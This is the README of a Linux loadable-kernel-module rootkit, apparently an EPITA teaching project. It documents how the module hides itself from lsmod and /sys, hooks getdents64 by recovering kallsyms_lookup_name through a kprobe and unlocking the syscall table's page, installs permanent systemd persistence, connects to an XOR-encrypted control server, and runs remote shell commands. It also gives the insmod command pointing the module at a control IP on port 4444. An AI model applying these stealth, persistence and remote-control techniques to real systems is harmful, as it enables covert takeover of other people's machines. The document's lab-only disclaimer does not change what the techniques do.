# WLKOM Rootkit — Linux Kernel Module

Pedagogical LKM (Loadable Kernel Module) for Linux 5.10+. On `insmod`, it hides
itself from userspace, installs persistence via systemd, and opens an encrypted
connection to the control server.

---

## Architecture

```
rootkit/
├── Makefile
├── assets/
│   └── wlkom.service        — human-readable systemd unit reference
├── include/
│   ├── crypto.h             — CRYPTO_KEY, xor_crypt
│   ├── protocol.h           — CMD_* opcodes, conn_ctx_t, send/recv_packet
│   ├── commands.h           — handle_packet
│   ├── network.h            — RECONNECT_DELAY, connect_init/exit
│   ├── hide.h               — hide_init/exit, hide_file/line API
│   ├── persist.h            — persist_init/exit
│   └── service_content.h    — systemd unit as a C string literal
└── src/
    ├── main.c               — module init/exit, module params
    ├── crypto.c             — XOR cipher
    ├── protocol.c           — kernel socket I/O, packet framing
    ├── commands.c           — command handlers (exec, upload, hide…)
    ├── network.c            — kthread, connection loop, reconnection
    ├── hide.c               — syscall hook (getdents64); read hook present but disabled
    └── persist.c            — systemd service installation
```

---

## Technical choices

### Split from a single `connect.c`

The original `connect.c` mixed XOR crypto, kernel socket primitives, packet
framing, command dispatch, and connection management in one 514-line file.
It was split along responsibility boundaries identical to the control server:

| File | Responsibility |
|---|---|
| `crypto.c` | `xor_crypt` — XOR stream cipher |
| `protocol.c` | `sock_send` / `sock_recv` (static); `send_packet` / `recv_packet` |
| `commands.c` | `handle_auth`, `handle_exec`, `handle_upload`, `handle_download`, `handle_hide_line`, `handle_packet` |
| `network.c` | Module-level state; `try_connect`, `run_packet_loop`, `connect_thread`, `connect_init`, `connect_exit` |

### `conn_ctx_t` — context struct instead of global state

The original code used module-level statics (`c2_sock`, `authed`) referenced
directly inside `send_packet`, `handle_auth`, and the packet loop. This created
invisible dependencies across the file: any function could silently read or
modify connection state.

After the split, `send_packet` and `recv_packet` live in `protocol.c` while the
socket is owned by `network.c`. Passing the socket as a raw parameter would have
pushed the 4-parameter limit on functions like `handle_hide_line` (which already
needs `payload`, `len`, and `hide`).

The solution is `conn_ctx_t` defined in `protocol.h`:

```c
typedef struct {
    struct socket *sock;
    bool           authed;
} conn_ctx_t;
```

A single pointer carries both the socket and the authentication flag. All
protocol and command functions receive `conn_ctx_t *ctx` as their first
parameter. `network.c` owns the lifetime of the struct; `commands.c` updates
`ctx->authed` on successful authentication. No globals leak across files.

### `c2_*` → `control_*` rename

All internal variables that referenced the old C2 naming convention were renamed:
`c2_sock` → `control_sock`, `c2_thread` → `control_thread`, `c2_ip` →
`control_ip`, `c2_port` → `control_port`. This aligns with the module parameter
names (`control_ip`, `control_port`) visible in `modinfo` and passed at `insmod`.

### `sock_send` / `sock_recv` in `protocol.c`

These two functions are implementation details of the packet layer — they perform
raw kernel socket I/O via `kernel_sendmsg` / `kernel_recvmsg`. They are `static`
inside `protocol.c` and never exposed in any header. Moving them to `network.c`
would have created a downward dependency (network → protocol → crypto), blurring
the layering. Keeping them in `protocol.c` makes the layer self-contained.

### `kprobe` to find `kallsyms_lookup_name`

Since kernel 5.7, `kallsyms_lookup_name` is no longer exported to out-of-tree
modules. `hide.c` registers a kprobe on the symbol name at init time to recover
its address at runtime, then unregisters the kprobe immediately. This avoids
any dependency on a custom kernel build or debug symbols.

### Syscall table write protection

Hooking `getdents64` and `read` requires writing to `sys_call_table`, which is
mapped read-only. `hide.c` uses `lookup_address` to find the PTE (Page Table Entry)
covering the table, sets the `_PAGE_RW` bit to make the page writable, replaces the
pointer, then clears the bit again. This is more surgical than toggling the CR0 WP
bit: it only unlocks the one physical page containing the table rather than disabling
write protection globally.

### `CONFIG_ARCH_HAS_SYSCALL_WRAPPER` — hook signature

All x86_64 kernels since 4.17 (including `linux-image-cloud-amd64`) set
`CONFIG_ARCH_HAS_SYSCALL_WRAPPER=y`. With this option, syscall table entries do not
point at the raw C function — they point at auto-generated `__x64_sys_*` wrappers that
pack all arguments into a `struct pt_regs` and call the function with a single pointer.

A hook declared as `long hook(unsigned int fd, struct linux_dirent64 *dirent, ...)` will
receive the 64-bit `pt_regs *` value truncated into the `unsigned int fd` parameter.
Dereferencing `dirent` then reads garbage and the filter has no effect (or panics).

**The correct signature** is `long hook(const struct pt_regs *regs)`, with syscall
arguments recovered directly from the register fields (`regs->di` = fd, `regs->si` =
dirent pointer, `regs->dx` = count). This is what `hide.c` implements.

### `read` hook disabled

The `hooked_read` function (used by `hide_line`) is compiled into the module but is
**not installed** in the syscall table. The `read(2)` syscall fires on every file
descriptor read in the entire system — thousands of times per second. Any bug in the
hook body (null pointer, bad user address, infinite loop) causes an immediate kernel
panic with no recovery. The getdents64 hook only fires during directory listings and
is safe to enable permanently. The read hook should only be activated after thorough
testing in an isolated environment.

### Module hiding

`hide_module` calls `list_del_init(&THIS_MODULE->list)` to remove the module from
the kernel's internal list, which is what `lsmod` and `/proc/modules` read.
On kernel < 6.4, `kobject_del(&THIS_MODULE->mkobj.kobj)` is also called to remove
the entry from `/sys/module/`. From 6.4 onward, this call can trigger a
use-after-free, so it is guarded with `LINUX_VERSION_CODE`.

### `service_content.h` — service unit as a string literal

The systemd unit content is stored as a `static const char[]` in
`include/service_content.h`. This avoids embedding the string in `persist.c`
directly (would bloat the function) and avoids a Makefile-generated header
(complex, fragile). The file is generated once and committed. Using
`sizeof(service_content) - 1` instead of `strlen` avoids a runtime scan.

### Persistence is intentionally permanent

`persist_exit` is a no-op. Removing the systemd service on `rmmod` would undo
persistence every time the module is unloaded for debugging. The service must be
removed manually if needed.

### Command execution via `call_usermodehelper`

Shell commands are executed with `call_usermodehelper("/bin/sh", ["-c", cmd])`.
stdout/stderr are redirected to `/tmp/.wlkom_out`. The rootkit reads the file
with `kernel_read` and sends its content, then deletes it. There is no
`popen`-style API in kernel space; this pattern is the standard approach for
running userspace programs from a module.

---

## Module parameters

Passed at `insmod`:

```bash
sudo insmod wlkom.ko control_ip=192.168.100.10 control_port=4444
```

| Parameter | Default | Description |
|---|---|---|
| `control_ip` | `127.0.0.1` | Control server IP |
| `control_port` | `4444` | Control server TCP port |

---

## Build

From the victim VM (kernel headers must match the running kernel):

```bash
make          # compile wlkom.ko
make clean    # remove build artifacts
make load     # insmod with default IP/port
make unload   # rmmod wlkom
```

Override at load time:
```bash
sudo insmod wlkom.ko control_ip=192.168.100.10 control_port=4444
```

> The warning "compiler differs from the one used to build the kernel" is harmless
> on Debian — it is the same GCC 13 under two binary names.

---

## Security & pedagogy

This module is developed strictly for the WLKOM pedagogical project (EPITA).
It must only be used inside the provided isolated VM environment.
Any use on a real system is illegal.
